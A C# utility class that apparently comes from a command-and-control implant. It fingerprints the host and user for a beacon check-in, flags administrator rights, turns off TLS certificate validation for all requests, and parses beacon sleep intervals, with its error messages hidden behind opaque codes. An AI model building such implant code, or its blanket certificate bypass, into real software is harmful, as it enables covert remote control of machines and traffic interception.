using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;

internal static class Utils
{
    internal static string GetEnvironmentalInfo(string commsId)
    {
        string userName;
        try
        {
            userName = WindowsIdentity.GetCurrent().Name;
        }
        catch
        {
            userName = Environment.UserName;
        }

        if (IsHighIntegrity())
        {
            userName += "*";
        }

        var userDomainName = Environment.UserDomainName;
        var hostname = Environment.GetEnvironmentVariable("COMPUTERNAME");
        var arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
        var pid = Process.GetCurrentProcess().Id;
        var processName = Process.GetCurrentProcess().ProcessName;
        Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir") ?? @"C:\Windows";
        return $"{userDomainName};{userName};{hostname};{arch};{pid};{processName};{commsId}";
    }

    internal static void AllowUntrustedCertificates()
    {
        try
        {
            ServicePointManager.ServerCertificateValidationCallback = (z, y, x, w) => true;
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"Unable to set the ServerCertificateValidationCallback to allow untrusted certs: {e}");
#endif
        }
    }

    internal static byte[] Compress(byte[] raw)
    {
        using (var memory = new MemoryStream())
        {
            using (var gzip = new GZipStream(memory, CompressionMode.Compress, true))
            {
                gzip.Write(raw, 0, raw.Length);
            }

            return memory.ToArray();
        }
    }

    internal static Type GetLoadedType(string assemblyName)
    {
        try
        {
            return Type.GetType(assemblyName, name => { return AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(z => z.FullName == name.FullName); }, null, true);
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[-] Unable to get loaded type: {assemblyName}: {e}");
#endif
            throw new Exception("0x0003");
        }
    }

    private static bool IsHighIntegrity()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    internal static string[] GetArgsAsArray(string commandLine)
    {
        var arrayOfPointersToArgStrings = Internals.CommandLineToArgvW(commandLine, out var numberOfArgs);
        if (arrayOfPointersToArgStrings == IntPtr.Zero)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] CommandLineToArgvW returned nullptr");
#endif
            throw new Exception("0x0001");
        }

        try
        {
            var args = new string[numberOfArgs];
            for (var i = 0; i < args.Length; i++)
            {
                var pointerToArg = Marshal.ReadIntPtr(arrayOfPointersToArgStrings, i * IntPtr.Size);
                args[i] = Marshal.PtrToStringUni(pointerToArg);
            }

            return args;
        }
        finally
        {
            Marshal.FreeHGlobal(arrayOfPointersToArgStrings);
        }
    }

    internal static byte[] Combine(byte[] first, byte[] second)
    {
        var combined = new byte[first.Length + second.Length];
        Buffer.BlockCopy(first, 0, combined, 0, first.Length);
        Buffer.BlockCopy(second, 0, combined, first.Length, second.Length);
        return combined;
    }

    internal static int ParseSleepTimeMillis(string time, string unit)
    {
        var beaconTime = int.Parse(time);
        switch (unit)
        {
            case "h":
                beaconTime *= 3600 * 1000;
                break;
            case "m":
                beaconTime *= 60 * 1000;
                break;
            case "s":
                beaconTime *= 1000;
                break;
            default:
#if DEBUG
                Program.STDOUT.WriteLine($"[-] Unexpected beacon time unit: {unit}");
#endif
                throw new Exception("0x0002");
        }

        return beaconTime;
    }

#if DEBUG
    internal static void TrimmedPrint(string message, string trimText, bool verbose = false)
    {
        if (trimText.Length > 200 && !verbose)
        {
            Program.STDOUT.WriteLine($"{message}\n{trimText.Substring(0, 200)}...");
        }
        else
        {
            Program.STDOUT.WriteLine($"{message}\n{trimText}");
        }
    }
#endif
}